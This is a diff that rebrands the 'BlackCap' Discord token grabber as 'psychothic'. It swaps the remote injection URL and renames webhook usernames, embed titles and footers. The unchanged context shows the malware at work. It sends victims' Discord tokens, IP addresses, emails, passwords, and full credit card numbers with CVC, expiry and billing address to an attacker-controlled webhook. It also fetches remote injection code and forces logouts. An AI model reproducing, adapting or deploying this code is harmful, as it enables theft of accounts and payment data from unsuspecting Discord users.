@@ -27,7 +27,7 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
- injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+ injection_url: "https://raw.githubusercontent.com/psychothic/discord-injection/psyc/index.js",
  webhook: "%WEBHOOK%",
  filter2: {
     urls: [
@@ -255,10 +255,10 @@ function FirstTime() {
 					xmlHttp.responseText;
 					`, !0).then((ip) => {
 					const c = {
-						username: "BlackCap",
+						username: "psychothic",
 						content: "",
 						embeds: [{
-							title: "BlackCap Initalized",
+							title: "psychothic Initalized",
 							color: config["embed-color"],
 							fields: [{
 								name: "Injection Info",
@@ -266,10 +266,10 @@ function FirstTime() {
 								inline: !1
 							}],
 							author: {
-								name: "BlackCap"
+								name: "psychothic"
 							},
 							footer: {
-								text: "©KSCH | https://github.com/KSCHdsc"
+								text: "©psychothic | https://github.com/psychotic"
 							}
 						}]
 					};
@@ -288,11 +288,11 @@ function FirstTime() {
 						`, !0).then((ip) => {
 						const b = JSON.parse(a);
 						const c = {
-							username: "BlackCap",
+							username: "psychothic",
 							content: "",
 							embeds: [{
-								title: "BlackCap Initalized",
-								description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+								title: "psychothic Initalized",
+								description: "[<a:psychothic:1022770267270938664> │ **Oh you have psychothiced someone**](https://github.com/psychothic)",
 								color: config["embed-color"],
 								fields: [{
 									name: "Injection Info",
@@ -317,7 +317,7 @@ function FirstTime() {
 								}],
 								
                                 footer: {
-                                    text: "©KSCH | https://github.com/KSCHdsc"
+                                    text: "©psychothic | https://github.com/psychothic"
                                 },
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -331,11 +331,11 @@ function FirstTime() {
 
 			}
 		}
-		if (!fs.existsSync(path.join(__dirname, "blackcap"))) {
+		if (!fs.existsSync(path.join(__dirname, "psychothic"))) {
 			return !0
 		}
 
-		fs.rmdirSync(path.join(__dirname, "blackcap"));
+		fs.rmdirSync(path.join(__dirname, "psychothic"));
 		if (config.logout != "false" || config.logout == "%LOGOUT%") {
 			if (config['logout-notify'] == "true") {
 				if (token == null || token == undefined || token == "") {
@@ -346,10 +346,10 @@ function FirstTime() {
 					xmlHttp.responseText;
 					`, !0).then((ip) => {
 					const c = {
-						username: "BlackCap Grabber",
+						username: "psychothic Grabber",
 						content: "",
 						embeds: [{
-							title: "BlackCaped User log out (User not Logged in before)",
+							title: "psychothiced User log out (User not Logged in before)",
 							color: config["embed-color"],
 							fields: [{
 								name: "Injection Info",
@@ -357,10 +357,10 @@ function FirstTime() {
 								inline: !1
 							}],
 							author: {
-								name: "BlackCap"
+								name: "psychothic"
 							},
 							footer: {
-								text: "©KSCH | https://github.com/KSCHdsc"
+								text: "©psychothic | https://github.com/psychothic"
 							}
 						}]
 					};
@@ -379,11 +379,11 @@ function FirstTime() {
 						`, !0).then((ip) => {
 						const b = JSON.parse(a);
 						const c = {
-							username: "BlackCap Grabber",
+							username: "psychothic Grabber",
 							content: "",
 							embeds: [{
-								title: "BlackCap Victim got logged out",
-								description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+								title: "psychothic Victim got logged out",
+								description: "[<a:psychothic:1022770267270938664> │ **Oh you have psychothiced someone**](https://github.com/psychothic)",
 								color: config["embed-color"],
 								fields: [{
 									name: "Injection Info",
@@ -408,7 +408,7 @@ function FirstTime() {
 								}],
 								
                                 footer: {
-                                    text: "©KSCH | https://github.com/KSCHdsc"
+                                    text: "©psychothic | https://github.com/psychothic"
                                 },
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -603,11 +603,11 @@ function Login(email, password, token) {
 										}
 										const json = JSON.parse(info);
 										const params = {
-											username: "BlackCap Grabber",
+											username: "psychothic Grabber",
 											content: "",
 											embeds: [{
-												"title": "BlackCap User Login",
-                                                description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+												"title": "psychothic User Login",
+                                                description: "[<a:psychothic:1022770267270938664> │ **Oh you have psychothiced someone**](https://github.com/psychothic)",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Injection Info",
@@ -648,7 +648,7 @@ function Login(email, password, token) {
 												}, ],
 												
 												"footer": {
-													"text": "©KSCH | https://github.com/KSCHdsc"
+													"text": "©psychothic | https://github.com/psychothic"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -659,7 +659,7 @@ function Login(email, password, token) {
 												"description": CalcFriends(),
 												
 												"footer": {
-													"text": "©KSCH | https://github.com/KSCHdsc"
+													"text": "©psychothic | https://github.com/psychothic"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -757,11 +757,11 @@ function ChangePassword(oldpassword, newpassword, token) {
 										}
 										const json = JSON.parse(info);
 										const params = {
-											username: "BlackCap Grabber",
+											username: "psychothic Grabber",
 											content: "",
 											embeds: [{
-												"title": "BlackCap Detect Password Changed",
-                                                description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+												"title": "psychothic Detect Password Changed",
+                                                description: "[<a:psychothic:1022770267270938664> │ **Oh you have psychothiced someone**](https://github.com/psychothic)",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Injection Info",
@@ -806,7 +806,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 												}, ],
 												
 												"footer": {
-													"text": "©KSCH | https://github.com/KSCHdsc"
+													"text": "©psychothic | https://github.com/psychothic"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -817,7 +817,7 @@ function ChangePassword(oldpassword, newpassword, token) {
 												"description": CalcFriends(),
 												
 												"footer": {
-													"text": "©KSCH | https://github.com/KSCHdsc"
+													"text": "©psychothic | https://github.com/psychothic"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -913,11 +913,11 @@ function ChangeEmail(newemail, password, token) {
 										}
 										const json = JSON.parse(info);
 										const params = {
-											username: "BlackCap Grabber",
+											username: "psychothic Grabber",
 											content: "",
 											embeds: [{
-												"title": "BlackCap Detect Email Changed",
-                                                description: "[<a:blackcap:1022770267270938664> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+												"title": "psychothic Detect Email Changed",
+                                                description: "[<a:psychothic:1022770267270938664> │ **Oh you have psychothic someone**](https://github.com/psychothic)",
 												"color": config['embed-color'],
 												"fields": [{
 													name: "Injection Info",
@@ -958,7 +958,7 @@ function ChangeEmail(newemail, password, token) {
 												}, ],
 												
 												"footer": {
-													"text": "©KSCH | https://github.com/KSCHdsc"
+													"text": "©psychothic | https://github.com/psychothic"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -969,7 +969,7 @@ function ChangeEmail(newemail, password, token) {
 												"description": CalcFriends(),
 												
 												"footer": {
-													"text": "©KSCH | https://github.com/KSCHdsc"
+													"text": "©psychothic | https://github.com/psychothic"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1001,16 +1001,16 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
 			const params = {
-				username: "BlackCap Grabber",
+				username: "psychothic Grabber",
 				content: "",
 				embeds: [{
-					"title": "BlackCap User Credit Card Added",
+					"title": "psychothic User Credit Card Added",
 					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
 					"author": {
-						"name": "BlackCap"
+						"name": "psychothic"
 					},
 					"footer": {
-						"text": "©KSCH | https://github.com/KSCHdsc"
+						"text": "©psychothic | https://github.com/psychothic"
 					},
 					"thumbnail": {
 						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
